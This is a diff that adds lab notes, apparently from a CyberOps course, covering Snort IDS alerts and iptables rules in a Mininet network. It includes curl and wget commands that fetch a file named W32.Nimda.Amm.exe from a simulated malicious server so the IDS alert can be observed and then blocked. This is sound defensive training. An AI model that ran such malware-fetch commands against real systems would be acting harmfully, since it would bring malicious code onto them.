@@ -1,0 +1,55 @@
+Part 1: Preparing the Virtual Environment
+
+[analyst@secOps ~]$ sudo ./lab.support.files/scripts/configure_as_dhcp.sh
+
+[analyst@secOps ~]$ ifconfig
+
+
+
+Part 2: Firewall and IDS Logs
+
+[analyst@secOps ~]$ sudo ./lab.support.files/scripts/cyberops_extended_topo_no_fw.py
+
+b. From the mininet prompt, open a shell on R1 using the command below:
+
+mininet> xterm R1(1st)
+[analyst@secOps ~]$ sudo ./lab.support.files/scripts/start_snort.py
+
+
+mininet> xterm H10
+[analyst@secOps ~]$ sudo ./lab.support.files/scripts/mal_server_start.py
+[analyst@secOps ~]$ netstat -tunpa
+
+mininet> xterm R1(2nd)
+
+[root@sec0ps analyst]# tail -f /var/log/snort/alert
+
+
+mininet> xterm H5
+[root@secOps analyst]# curl -O 209.165.202.133:6666/W32.Nimda.Amm.exe
+
+
+[root@secOps analyst]#tcpdump –i H5-eth0 –w nimda.download.pcap&
+
+[root@secOps analyst]#curl -O 209.165.202.133:6666/W32.Nimda.Amm.exe
+
+[root@secOps analyst]# fg 
+
+[root@secOps analyst]# ls -l
+
+
+Step 2: Tuning Firewall Rules Based on IDS Alerts
+mininet > xterm R1(3rd)
+
+[root@secOps ~]# iptables -L -v
+
+[root@secOps ~]# iptables -I FORWARD -p tcp -d 209.165.202.133 --dport 6666 -j DROP
+
+ON H5
+[root@secOps analyst]# wget 209.165.202.133:6666/W32.Nimda.Amm.exe
+
+
+Part 3: Terminate and Clear Mininet Process
+mininet>quit
+
+analyst@secOps scripts]$ sudo mn –c
